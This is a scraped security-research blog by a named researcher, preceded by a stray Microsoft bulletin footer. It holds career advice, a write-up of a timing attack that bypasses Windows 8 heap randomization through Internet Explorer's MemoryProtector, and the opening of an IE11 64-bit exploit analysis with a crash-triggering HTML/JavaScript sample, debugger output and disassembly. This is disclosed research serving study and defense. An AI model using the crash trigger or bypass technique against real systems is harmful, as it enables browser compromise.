* V1.2 (November 12, 2008): Corrected a registry key verification entry for Internet Explorer 6 for all supported x64-based editions of Windows Server 2003.

*Built at 2014-04-18T13:49:36Z-07:00*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025



=== Content from ifsec.blogspot.com_1d28eca1_20250126_023413.html ===


# Ivan Fratric's Security Blog

## Tuesday, February 6, 2018

### [So you want to work in security? (and for some reason ended up here rather than reading other people’s posts on the topic).](https://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html)

A lot of people (including my colleagues from Google, [Parisa](https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23) and [Michal](https://lcamtuf.blogspot.ch/2016/08/so-you-want-to-work-in-security-but-are.html)) already wrote great posts on this topic, and I fully encourage you to read them. I expect there will be a lot of overlap with things already said, but every once in a while I get a question like this, so rather than typing something every time and linking to the aforementioned posts, I decided to write my own version that includes some of my own personal observations and experiences.

Take note that I’m an application security guy an am writing this from a vulnerability research / security review / bug hunting / hacking / whatever you choose to call it perspective. There are other career paths in security such as in secure development, malware analysis, infrastructure security and others with which I am not as intimately familiar and might not be the right person to give advice on.

So, who am I and why should you trust me with this topic? Well, first of all I'm not saying you *should* trust me because everyone’s experience and everyone’s path will be different. But just in case you are curious: I’m currently a member of [Google Project Zero](https://googleprojectzero.blogspot.ch/), I used to be a member of the Google Security team, I’m the author of [several](https://github.com/ivanfratric/winafl) [security](https://github.com/google/domato) [tools](https://github.com/ivanfratric/ropguard) and if you scroll sufficiently long down this blog (which hasn’t been updated in a while, see the GPZ blog for the most recent posts) you’ll see that I’ve been tinkering with this security stuff for over 10 years.

But my background is somewhat besides the point because people I know in security come from a variety of different backgrounds. For example, I also have a fairly strong academic background (with a Ph.D. in computing, having worked at an university a long time), but that is fairly atypical among my peers and certainly not a requirement to get into security. That is, of course, not to say that having any degree not useful and I do feel that my education gave me a solid foundation to build upon later. However, regardless of the education you choose or already have, there is one thing most of the people in security I know have in common, and here we come to the first tip:

Do stuff on your own

For the majority of people I know in the industry, security was a hobby first before it became a job. Of course, if you are just considering getting into security, telling you to do stuff on your own does not help you much without telling you how you can get started doing that. Keep on reading because we’ll get to that below. But first, one other thing you should be aware of (don’t let it discourage you, we’ll see how you can deal with it later).

Don’t look now but getting started is more difficult now than it was 10 years ago

I suspect not everyone will admit it, but security did improve rather significantly over time. Sure, if you dig enough you’re going to find pieces of software and hardware against which techniques from over 10 years ago still work. But take a look at, for example, web browsers. When I was working on my first Windows exploit (a heap overflow) I was getting frustrated because Microsoft recently introduced Safe Unlinking so generic well known heap exploitation techniques I read about no longer worked. 10 years forward and someone just getting started wouldn’t just have to deal with Safe Unlinking and stack cookies, but also SafeSEH/SEHOP, DEP, ASLR, CFG, ACG, a sandbox around every major browser and who knows what else. And it’s not limited to web browsers. If you take a look at the commonly used web application frameworks 10 years ago and now, you’ll also see significant differences in the security posture.

Don’t be afraid if the words in the previous paragraph mean nothing to you (yet).

So, how do you combat the increasingly steep difficulty curve?

Take advantage of the learning resources

While in general, the difficulty of getting started is higher, the fact is, there are also a lot more learning resources out there now than there were before.

But another word of warning: You need to be able to go out and learn on your own. Nobody is going to hold your hand or be your mentor (there might always be a master and an apprentice with the Sith, but it rarely works that way with hackers). If you prefer to follow a pre-set curriculum (like admittedly I did for the large part of my education) you’re not going to get very far in security.

Before you can get to the right learning resources, you need to start asking the right questions. Googling for “how to hack” and similar is still going to result in the same bullshit now as it ever did. Instead, try asking more subtle questions like:

1. How does this piece of software/hardware I’m interested in work? What technology it is based on? Is there source code I can read? Tutorials? Books?

2. Did someone already manage to break this piece of software/hardware I want to break? Did they publish writeups? Exploits? Conference presentations? Do I truly understand what they did?

It follows that you yourself must be rather technically savvy to understand how a real-world piece of software or hardware made by someone else works. While writing code and reading code are not exactly the same skills, there is a significant overlap so if you are not comfortable coding, this is something you might want to improve before digging further into security.

Don’t forget the second point. While I was reasonably good when it comes to technical stuff even before, my understanding of security didn’t come until I started reading vulnerability research and exploits published by other people.

Yet another word of warning: Don’t give up when you encounter things you don’t understand. Especially when getting started and reading various resources you’re going to encounter a lot of it. Skipping those parts is the easy path but it is also the wrong path to take. Instead think of encountering every bit of information you don’t understand as a clue about what else you need to learn.

Although I wrote that nobody is going to hold your hand, that doesn’t mean you should not ask questions. In fact, you should feel free to. People won’t do your job for you but they just might give you a nod in the right direction if you get stuck.

Use Twitter

Seems strange to endorse a specific social network, but the fact of the matter is that a lot of security community uses Twitter to share news, but more importantly links to recent research, vulnerabilities, PoCs, conference presentations, source and the like. I don’t really know how this came to pass, perhaps it’s the short message format that is more convenient for people to share links to resources without getting (too) encumbered by unnecessary long discussions. So find people on Twitter who work on or publish stuff you are interested in and check out what they tweet.

Besides Twitter, some other places you can find interesting resources are [r/netsec](https://www.reddit.com/r/netsec/) and [Hacker News](https://news.ycombinator.com/) (though it carries other stuff besides just security). Check out also presentations and recordings of talks from security conferences (there is a lot of them, but not all of them are good. Focus on the more technical ones).

Playing CTFs is a good way to learn

Another strange advice for me to give as I myself almost never play them, but remember what I wrote about the difficulty curve? CTFs can make your learning experience more gradual because challenges come in various difficulties (you can usually tell by the number of points each task is worth) so you can start with the easier ones and then build up from there. For example, sometimes there are exploitation challenges with some of the mitigations turned off. There is also some comfort in knowing that there *is* a bug / way to solve it.

There is a CTF somewhere almost every week, most of them can be played remotely and you can find the schedule [here](https://ctftime.org/). If you fail at solving a task, don’t forget to check out the writeups from the people who did solve it.

CTFs can be a pretty gratifying experience but once you get better, don’t be afraid to go out and try yourself against a real-world target. You might surprise yourself!

Oh, and when it comes to real-world targets:

Don’t be afraid to fail. A lot.

Especially these days, vulnerability research can be a very frustrating experience. Most of the things you’ll try won’t work and you need to come to accept that, but don’t let it discourage you from trying it anyway. It doesn’t happen just to you, it happens to me and it happens to other experienced researcher as well. But it's easy to think it happens only to you because, after all, what you end up seeing from other people are their successes and not their failures. The important thing is, if your idea fails, learn why it failed before moving on.

You are smarter than you think (conversely: other people are not as smart as you think)

This might be a controversial point because other people gave advice along the lines of “you are not smarter than the developers”. While this is true in general and good advice for a lot of people people already in the industry, it might be the wrong thing to say to a lot of people who are just getting started or are just considering getting started. The thing is, after seeing what other smart people do, without having done anything in the field yourself, it is easy to doubt in one's own abilities. Let me give you a personal example:

It might sound strange to you now, but when I started doing security as a hobby I thought I was never going to be “l33t” enough to find bugs in Windows. And I might have never tried, except I found my first Windows bug by accident: I was fuzzing some crappy image library and after a while I had some samples that caused crashes. And when I accidently clicked one of those crashing samples in Windows, Windows Explorer crashed - and that was CVE-2008-3013.

Another case in point: When doing a review of a piece of software, you might have an idea and then think “nah, that’s stupid, the developers surely thought of that”. The thing is, they often haven’t. To be fair, that’s not because they are stupid, that’s because they thought about other problems at the time. But if the mindset of “I’m smarter than them” helps you break through the artificial limitations you set for yourself, then use it and to hell with being humble.

When you’re talking to other people, especially developers, then it is the time to drop it though. You’re going to have a much more pleasant time interacting with people if they’ll see you as someone who wants to work with them rather than an adversary. This doesn’t mean trusting whatever you’re being told though. Remember, they are the experts in their code, but you’re the expert in security.

What do I do once I’m ready to show my skills to the world?

To start with, you can do that while earning something at the same time: A lot of companies, both small and large offer bug bounties for skilled researchers who find bugs in their product. [Google](https://www.google.com/about/appsecurity/reward-program/) has it, [Facebook](https://www.facebook.com/whitehat) has it, [Microsoft](https://technet.microsoft.com/en-us/security/dn425036) has it as well as [lots](https://www.hackerone.com/) of [others](https://www.bugcrowd.com/).

Even if you’re looking at something that doesn’t have a bug bounty, but it’s something a lot of people use and care about, finding a bug in it can be a nice way to showcase your skills and writing about your research can help other people get started as well as get you noticed.

While it sometimes gets disproportionally large amount of attention, publishing vulnerabilities is not the only way to contribute to the community - creating useful tools, doing defensive research etc. are cool as well!

What else do I need to know?

A life of a security researcher might not be as glorious as you imagine it. You’re going to sit in front of a computer. A lot. So if you find the idea of that off putting this might not be the right career path for you. It is also quite intellectually challenging and is pretty much the opposite of a routine job. Which means it can be quite rewarding, but also quite mentally exhausting.

Posted by

[Ivan Fratric](https://www.blogger.com/profile/03011648433786848352 "author profile")

at

[4:21 AM](https://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html "permanent link")

[271 comments:](https://www.blogger.com/comment/fullpage/post/2001595886969899899/18768668536690975)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=2001595886969899899&postID=18768668536690975&from=pencil "Edit Post")

## Tuesday, June 16, 2015

### [Dude, where’s my heap?](https://ifsec.blogspot.com/2015/06/dude-wheres-my-heap.html)

#### Or: Bypassing High-Entropy Bottom-Up Randomization in Windows 8 by abusing IE’s Memory Protection

*Note: This is a copy of a blog post that was originally published on the [Google Project Zero blog](http://googleprojectzero.blogspot.com/2015/06/dude-wheres-my-heap.html).*

The ability to place controlled content to a predictable location in memory can be an important primitive in exploitation of memory corruption vulnerabilities. A technique that is commonly used to this end in browser exploitation is [heap spraying](http://en.wikipedia.org/wiki/Heap_spraying): By allocating a large amount of memory an attacker ensures that some of the allocations happen in a predictable memory region. In order to break this technique, in Windows 8 Microsoft introduced [High Entropy Bottom-Up Randomization](https://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf). Essentially, it introduces 1TB of variance in start address of heap (as well as stack and other allocations) in 64-bit processes. In a traditional heap spraying scenario, this would mean that the attacker needs to allocate over 1TB of memory in order to place content at a predictable location which is infeasible on today’s computers. Internet Explorer 11 (as well as various other 64-bit processes on Windows 8) employs this mitigation whenever it uses a 64-bit tab process (such as in Metro mode or with Enhanced Protected Mode turned on).

Internet Explorer also introduced another mitigation called [MemoryProtector](http://blog.fortinet.com/post/is-use-after-free-exploitation-dead-the-new-ie-memory-protector-will-tell-you) in order to prevent exploitability of use-after-free vulnerabilities. The two mitigations are not meant to be related. However, somewhat unexpectedly, one can be (ab)used to bypass the other. In one sentence, it is possible to use a timing attack on MemoryProtector to reveal the offset used by High-Entropy Bottom-Up Randomization, thus completely bypassing it.

## The Issue

MemoryProtector is intended to prevent exploitation of a certain kind of use-after-free vulnerabilities. Since details of the mitigation have already been published in various places (such as [here](http://blog.fortinet.com/post/is-use-after-free-exploitation-dead-the-new-ie-memory-protector-will-tell-you)), only the bare essentials sufficient to understand the issue will be given here. Simplified, MemoryProtector prevents exploitability of use-after-free vulnerabilities in which a pointer to a freed object is kept on the stack. This is a common situation in web browsers caused by the code such as

Node\* node = getNodeFromSomewhere();
fireJavaScriptCallback(); // kills node
node->DoSomething();

In the example above, a pointer to the Node object is obtained and stored in a local variable (on stack). After that, a function is called which ends up causing JavaScript callback. Attacker-controlled code in the JavaScript callback causes node to be deleted, but after the control flow returns to the code above, the node is referenced after being deleted (use-after-free condition).

MemoryProtector works by preventing the object (Node in the example above) from being freed if its address can be found on the stack (in the node variable in the example above). If MemoryProtector is enabled, for certain classes, deleting won’t free the memory right away - it will only zero it out. Once the size of those freed-but-not-really objects reaches a certain threshold, MemoryProtector will scan the stack and identify which of these objects have their addresses on the stack. Those that do not will be deleted. The others are left untouched and will be considered again during the next stack scan. Thus it is ensured that no object gets freed while its address is on the stack.

To demonstrate the issue that enables us to defeat High-Entropy Bottom-Up Randomization several observations need to be made. The first observation is that, when scanning the stack, MemoryProtector cannot differentiate between addresses and other types of data on the stack. Thus, it will treat all data on the stack (such as, for example, user-controlled double-precision numbers or 64-bit integers) as addresses. Since some of this data can be attacker-controlled, an attacker can deliberately place something that looks like an address on the stack and prevent an object located at that address from being freed. In fact, an attacker might be able to place multiple addresses on the stack and prevent freeing of objects at any of those addresses. By itself this isn’t very dangerous - it can cause memory exhaustion and not much else.

The second observation to make is that freeing memory takes time, especially for large (such as 1MB used by the PoC) objects where free/delete ends up calling VirtualFree. The time is sufficiently large to observe a difference between the time it takes to free a large object and attempting to delete an object without actually freeing it (which happens with MemoryProtector) if the address of the object is present on the stack during the delete attempt.

This is demonstrated in Figure 1. Notice that for memory range [0x9ddc000000, 0x9de0000000] the time it takes for MemoryProtector to run is much less than for other ranges because the block doesn’t get freed during the run. Also notice that the next run takes longer than average. This is because during this run two blocks are freed (one from the current run and one from the previous one).

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuEcX6cE4kbeWqLjoRU3X9Ikfx7MPl7K6P2vKPBLSwoHfx6LjpPMKfEbbLaKcCe_DZqcBiBABWbYLGVeu3PUzbJlnJQVA0ukWB0m3eWn5QtknBnSMBXk_c6SKJe_3CP6-30DVUC0br96k/s400/test1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuEcX6cE4kbeWqLjoRU3X9Ikfx7MPl7K6P2vKPBLSwoHfx6LjpPMKfEbbLaKcCe_DZqcBiBABWbYLGVeu3PUzbJlnJQVA0ukWB0m3eWn5QtknBnSMBXk_c6SKJe_3CP6-30DVUC0br96k/s1600/test1.png)
Figure 1.

Thus by spraying the stack with a range of possible addresses and then triggering a free and measuring the time it takes to free (or not) the object, it is possible to determine if the object was allocated in the given address range or not. If an address of the object is detected, the attacker will also learn the approximate offset used by High Entropy Bottom-Up Randomization and will be able to predict addresses used by future (or past) allocations.

## Description of the Exploit

There are several hoops to jump through in order to exploit the issue. The first one is placing controllable data on the stack. Standard stack spraying techniques such as using a JavaScript function with a lot of local variables or calling a JavaScript function with a lot of arguments don’t actually work because JavaScript variables in IE are stored in a packed format which makes it difficult to have a variable whose representation could also be mistaken for an address (that is, different than the address of a variable itself). However, I have observed that during some numeric computations, such as multiplication, JavaScript engine will place intermediate results in a native double format on the stack. It is trivial to create double-precision numbers that will look like addresses in the required range (0x0000000000 to 0x10000000000).

The second issue is reducing the search space because we don’t want to have to try out all addresses in the lower 1TB range. Since we will be using a large allocation (allocated using VirtualAlloc) it is known that the allocation will be made on 0x1000 boundary (in Windows 8). Thus there are ‘only’ 0x10000000 possibilities. Note also that for each experiment we can place multiple values on the stack at once. The current PoC can test 0x4000 possibilities in one experiment, thus also reducing the number of required experiments to 0x4000 (16K). If each experiment allocates 1M of memory, this means that all experiments allocate a total of 16GB of memory throughout a single PoC run. However note that these allocations are not needed at the same time, in fact only two 1M allocations are needed at any given time plus some stack space and other smaller heap allocation made by the PoC. Thus the PoC should run fine even on machines with very low amount of free RAM.

The next issue is triggering MemoryProtector at the desired time. By looking at the code of MemoryProtection::CMemoryProtector::ReclaimMemory() function, it is easily determined that MemoryProtector triggers after more than 100000 bytes of memory is freed. This is fine because we’ll use an allocation larger than that anyway. In the PoC, MemoryProtector is triggered by first setting the ‘title’ property of a Button HTML element to a large (1MB) string and then to a small string. If the address of a large string is not found on a stack when MemoryProtector is triggered, it will get freed. Otherwise, it will get freed next time MemoryProtector runs if the allocation address is no longer on the stack.

We also need a way to measure time precisely since the times involved will be in sub-millisecond intervals. Fortunately, we can use performance.now() API which is [supported](http://blogs.msdn.com/b/ie/archive/2012/10/19/web-performance-when-millisecond-resolution-just-isn-t-enough.aspx) in Internet Explorer for this.

The full PoC can be found [here](https://code.google.com/p/google-security-research/issues/detail?id=445).
## Reproducing the Issue

To reproduce the issue you first need to ensure that IE runs tab process in 64-bit mode. There are several ways to accomplish this. Probably the easiest is to open the PoC in IE in Metro mode where 64-bit tab process is used by default. In desktop mode 64-bit is still not the default (though presumably this will change at some point in the future). But you can have 64-bit tab processes in desktop mode as well either by making IE run in a single process mode or enabling Enhanced Protected Mode.

You can make IE run in a single process mode by setting TabProcGrowth registry key to 0, however note that this should never be used when browsing untrusted websites and opening untrusted files as it disables the IE sandbox.

The recommended way to run IE in 64-bit mode is to enable Enhanced Protected Mode,  which can be done by changing Internet Options -> Advanced -> Security -> ‘Enable Enhanced Protected Mode’ and ‘Enable 64-bit processes for Enhanced Protected Mode’. Not only will this enable additional mitigations that can be found on 64-bit Windows but will also enable additional sandboxing features, so I fully recommend that users run IE like this.

Note however, that when Enhanced Protected Mode is enabled, you’ll need to open the PoC in the Internet Zone because Enhanced Protected Mode does not get applied to Local intranet and Trusted sites (including local files). If successful, you should see processes like this when opening the PoC.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfgSP4X1l_827RhBoOzZwGK6wbkFvTEkv2_DVejdU-NrH-MeJROy3UXfQbph96MVknM9g3Tf3J2HnHBBUS8XQUsA_0nYVYPZJ1JnXlinlO1eNM77F0Yh8ybEn4Ozi7tz2IqaN2KC8p5j4/s400/ieproc.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfgSP4X1l_827RhBoOzZwGK6wbkFvTEkv2_DVejdU-NrH-MeJROy3UXfQbph96MVknM9g3Tf3J2HnHBBUS8XQUsA_0nYVYPZJ1JnXlinlO1eNM77F0Yh8ybEn4Ozi7tz2IqaN2KC8p5j4/s1600/ieproc.png)
Figure 2.

Note: It’s also possible to run the PoC in 32-bit mode with some changes. You need to replace the line ‘o.cur = min + 0x40;’ with ‘o.cur = min + 0x20;’ and the line ‘var max = 0x10000000000;’ with ‘var max = 0x100000000;’. However note that High Entropy Bottom-Up Randomization doesn’t get applied to 32-bit processes so all allocations should (predictably) happen in a low memory range.

After you have the test environment set up, just click “Dude, where’s my heap?” button on the PoC and wait. The entire run of the PoC takes about 30 seconds on a reasonably modern computer.

After the test run finishes, you should see the detected allocation memory range as well as detailed output of memory ranges sorted by time it took to run the experiment. By opening IE process in your favorite debugger you should be able to verify that memory allocations do indeed happen in the detected range. This is demonstrated in Figure 3.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbvzeAXKr6QyzhQFIhMKCYap6eaWi6wv-vjYqxKl8vJFUq6yh5WHvLc4HxaoV4S5humVXvBE_lt_DcMp6-MF9B9Mp0cvx5T3D2__itDf0PPcXMLwM8AVezXP3vQuwSy4dgBFud3qvP_j4/s400/test2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbvzeAXKr6QyzhQFIhMKCYap6eaWi6wv-vjYqxKl8vJFUq6yh5WHvLc4HxaoV4S5humVXvBE_lt_DcMp6-MF9B9Mp0cvx5T3D2__itDf0PPcXMLwM8AVezXP3vQuwSy4dgBFud3qvP_j4/s1600/test2.png)
Figure 3.

The PoC currently uses a very simple heuristics to detect if the run was successful - there needs to be a single memory range for which the run time is faster than for all other runs by at least a threshold %. Note that this PoC is made just for demonstration purposes and there are likely ways to make the poc both faster and more reliable. It could be made more reliable for example by repeating the experiments for the small number of best candidates (and possibly adjacent ranges) to verify the result or repeating the entire run if the result can’t be verified. It could also be made faster by breaking early if a good candidate is found in one of the experiments (expected to reduce the run time by half on average), by finding a way to put more user-controlled data on the stack or possibly by incorporating some other insight about the entropy of bottom-up randomization.
## Vendor response

The issue was reported to Microsoft on January 19th in the context of the Mitigation Bypass Bounty program. The initial response (on January 28th) was that the “submission meets Microsoft’s criteria for the Mitigation Bypass” and “has novel elements”. On April 23rd (~3 months later) I was notified that “investigation determined the effort involved to ship a fix, that enabled MemoryProtect to not allow ASLR bypass down level, would be a significant amount of resources (and possible regression risk) for an issue primarily applicable to a non-default configuration” and Microsoft “will explore ways to mitigate this problem in the next version of our product”. MSRC noted this decision was based on the facts that “64-bit IE is a non-default configuration” and “MemoryProtect has led to a significant overall decrease of IE case submissions”. Thus the issue is still unfixed.
## Potential collision with HP Security Research

On February 5th (2 weeks after I sent my report to Microsoft) HP Security Research announced that they also received a [Mitigation Bypass bounty](http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Microsoft-disclosure-and-the-125-000-bug-bounty/ba-p/6704588#.VW8E-a04Z4s) from Microsoft. In addition to other attacks they mention that “attacker can use MemoryProtection as an oracle to completely bypass ASLR” which leads me to believe that there is a partial (but not complete, judging by the Microsoft response) overlap between our research.

The details of HP’s research are unknown at this time but if I had to guess, I’d say they were using the same basic principle to map the free memory of a 32-bit process. By finding which memory regions are already allocated (addresses where the attacker can’t allocate memory on) it might be possible, based on the allocation address and size, to tell which of these allocations were made by executable modules.
## Conclusion

Both High-Entropy Bottom-Up Randomization and MemoryProtector are really useful mitigations. Without MemoryProtector or in scenarios where the attacker does not have the same amount of control as in a web browser, High-Entropy Bottom-Up Randomization is an efficient defense against heap spraying and similar techniques. Similarly MemoryProtector is an efficient defense for use-after-free vulnerabilities where the object reference is kept on the stack. While it might be possible to bypass it in specific scenarios, it renders a large number of vulnerabilities unexploitable.

It is only when these mitigations come together in an environment with a lot of control given to the attacker, including control over the stack and heap allocation as well as the ability to accurately measure time, that the problem manifests. For what it is worth I agree that fixing the issue would be very difficult without making serious compromises because it basically exploits how the mitigations in question work as intended. Microsoft has a tough job if they indeed want to fix this issue in the future.

As new mitigations grow both in number and complexity this might not be the last time we see them interacting in unexpected ways.

Posted by

[Ivan Fratric](https://www.blogger.com/profile/03011648433786848352 "author profile")

at

[3:07 AM](https://ifsec.blogspot.com/2015/06/dude-wheres-my-heap.html "permanent link")

[113 comments:](https://www.blogger.com/comment/fullpage/post/2001595886969899899/6880789167194217831)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=2001595886969899899&postID=6880789167194217831&from=pencil "Edit Post")

## Wednesday, November 6, 2013

### [Exploiting Internet Explorer 11 64-bit on Windows 8.1 Preview](https://ifsec.blogspot.com/2013/11/exploiting-internet-explorer-11-64-bit.html)

*Note: The vulnerability described here has been patched by Microsoft in October 2013 security update.*

Earlier this year, Microsoft announced [several security bounty programs](http://www.microsoft.com/security/msrc/report/bountyprograms.aspx) one of which was a bounty program for bugs in Internet Explorer 11. I participated in this program and relatively quickly found a memory corruption bug. Although I believed the bug could be exploited for remote code execution, due to lack of time (I just became a father right before the bounty programs started so I had other preoccupations) I haven’t actually developed a working exploit at the time. However, I was interested in the difficulty of writing an exploit for the new OS and browser version so I decided to try to develop an exploit later. In this post, I’ll first describe the bug and then the development of a working exploit for it on 64-bit Windows 8.1 Preview.

When setting out to develop the exploit I didn't strive to make a 100% reliable exploit (The specifics of the bug would have made it difficult and my goal was to experiment with the new platform and not make the next cyber weapon), however I did set some limitations for myself that would make the exercise more challenging:
1. The exploit should not rely on any plugins (so no Flash and no Java). I wanted it to work on the default installation.
2. The exploit must work on 64-bit IE and 64-bit Windows. Because 32-bit would be cheating as many exploit mitigation techniques (such as heap base randomization) aren't really effective on 32-bit OS or processes. Additionally, there aren't many 64-bit Windows exploits out there.
3. No additional vulnerabilities should be used (e.g. for ASLR bypass)

One prior note about exploiting 64-bit Internet Explorer: In Windows 8 and 8.1, when running IE on the desktop (“old interface”) the renderer processes of IE will be 32-bit even if the main process is 64-bit. If the new (“touch screen”) interface is used everything is 64-bit. This is an interesting choice and makes the desktop version of IE less secure. So in the default environment, the exploit shown here actually targets the touch screen interface version of IE.

To force IE into using 64-bit mode on the desktop for exploit development, I forced IE to use single process mode (TabProcGrowth registry key). However note that this was used for debugging only and, if used for browsing random pages, it will make IE even less secure because it disables the IE’s sandbox mode.

***The bug***

A minimal sample that triggers the bug is shown below.

```
<script>
function bug() {
 t = document.getElementsByTagName("table")[0];
 t.parentNode.runtimeStyle.posWidth = "";
 t.focus();
}
</script>
<body onload=bug()>
<table><th><ins>aaaaaaaaaa aaaaaaaaaa

```

And here is the the debugger output.

```
(4a8.440): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:
00007ff8`e0c90306 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:000000a6`e1466168=????????????????
0:010> r
rax=000000a6d1466170 rbx=000000a6d681c360 rcx=000000000000007f
rdx=0000000001ffffff rsi=000000a6d5960330 rdi=00000000ffffffff
rip=00007ff8e0c90306 rsp=000000a6d61794b0 rbp=000000a6d5943a90
r8=0000000000000001  r9=0000000000000008 r10=00000000c0000034
r11=000000a6d61794a0 r12=00000000ffffffff r13=00000000ffffffff
r14=000000000000000b r15=00000000ffffffff
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
MSHTML!Layout::ContainerBox::ContainerBox+0x1e6:
00007ff8`e0c90306 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:000000a6`e1466168=????????????????
0:010> k
Child-SP          RetAddr           Call Site
000000a6`d61794b0 00007ff8`e0e49cc0 MSHTML!Layout::ContainerBox::ContainerBox+0x1e6
000000a6`d6179530 00007ff8`e0e554a8 MSHTML!Layout::TableGridBox::TableGridBox+0x38
000000a6`d6179590 00007ff8`e0e553c2 MSHTML!Layout::TableGridBoxBuilder::CreateTableGridBoxBuilder+0xd8
000000a6`d6179600 00007ff8`e0c8b720 MSHTML!Layout::LayoutBuilder::CreateLayoutBoxBuilder+0x2c9
000000a6`d61796c0 00007ff8`e0c8a583 MSHTML!Layout::LayoutBuilderDriver::StartLayout+0x85f
000000a6`d61798d0 00007ff8`e0c85bb2 MSHTML!Layout::PageCollection::FormatPage+0x287
000000a6`d6179a60 00007ff8`e0c856ae MSHTML!Layout::PageCollection::LayoutPagesCore+0x2aa
000000a6`d6179c00 00007ff8`e0c86389 MSHTML!Layout::PageCollection::LayoutPages+0x18e
000000a6`d6179c90 00007ff8`e0c8610f MSHTML!CMarkupPageLayout::CalcPageLayoutSize+0x251
000000a6`d6179db0 00007ff8`e0df85ca MSHTML!CMarkupPageLayout::CalcTopLayoutSize+0xd7
000000a6`d6179e70 00007ff8`e12d472d MSHTML!CMarkupPageLayout::DoLayout+0x76
000000a6`d6179eb0 00007ff8`e0d9de95 MSHTML!CView::EnsureView+0xcde
000000a6`d617a270 00007ff8`e0d1c29e MSHTML!CElement::EnsureRecalcNotify+0x135
000000a6`d617a310 00007ff8`e1556150 MSHTML!CElement::EnsureRecalcNotify+0x1e
000000a6`d617a350 00007ff8`e1555f6b MSHTML!CElement::focusHelperInternal+0x154
000000a6`d617a3b0 00007ff8`e19195ee MSHTML!CElement::focus+0x87
000000a6`d617a400 00007ff8`e06ed862 MSHTML!CFastDOM::CHTMLElement::Trampoline_focus+0x52
000000a6`d617a460 00007ff8`e06f0039 jscript9!amd64_CallFunction+0x82
000000a6`d617a4b0 00007ff8`e06ed862 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x154
000000a6`d617a550 00007ff8`e06f26ff jscript9!amd64_CallFunction+0x82

```

As can be seen above, IE crashes in MSHTML!Layout:ContainerBox:ContainerBox function while attempting to read uninitialized memory pointed to by rax + rdx\*8. rax actually points to valid memory that contains a CFormatCache object (which looks correct given the PoC), while the value of rdx (0x0000000001ffffff) is interesting. So I looked at the code of ContainerBox:ContainerBox function to see where this value comes from and also what can be done if an attacker would control the memory at rax + 0xffffff8.

```
00007ffb`dac00145 83cdff          or      ebp,0FFFFFFFFh
...
00007ffb`dac0023e 440fb64713      movzx   r8d,byte ptr [rdi+13h]
00007ffb`dac00243 410fb6c0        movzx   eax,r8b
00007ffb`dac00247 c0e805          shr     al,5
00007ffb`dac0024a 2401            and     al,1
00007ffb`dac0024c 0f84048f6200    je      MSHTML!Layout::ContainerBox::ContainerBox+0x562 (00007ffb`db229156)
00007ffb`dac00252 440fb76f68      movzx   r13d,word ptr [rdi+68h]
...
00007ffb`db229156 448bed          mov     r13d,ebp
00007ffb`db229159 e9f9709dff      jmp     MSHTML!Layout::ContainerBox::ContainerBox+0x137 (00007ffb`dac00257)
...
00007ffb`dac002db 410fbffd        movsx   edi,r13w
...
00007ffb`dac002fb 8bcf            mov     ecx,edi
00007ffb`dac002fd 8bd7            mov     edx,edi
00007ffb`dac002ff 48c1ea07        shr     rdx,7
00007ffb`dac00303 83e17f          and     ecx,7Fh
00007ffb`dac00306 488b04d0        mov     rax,qword ptr [rax+rdx*8] ds:0000007a`390257f8=????????????????
00007ffb`dac0030a 488d0c49        lea     rcx,[rcx+rcx*2]
00007ffb`dac0030e 488d14c8        lea     rdx,[rax+rcx*8]
00007ffb`dac00312 8b4cc810        mov     ecx,dword ptr [rax+rcx*8+10h]
00007ffb`dac00316 8b420c          mov     eax,dword ptr [rdx+0Ch]
00007ffb`dac00319 3bc8            cmp     ecx,eax
00007ffb`dac0031b 0f83150d7500    jae     MSHTML!Layout::ContainerBox::ContainerBox+0x750f16 (00007ffb`db351036)
00007ffb`dac00321 ffc0            inc     eax
00007ffb`dac00323 89420c          mov     dword ptr [rdx+0Ch],eax

```

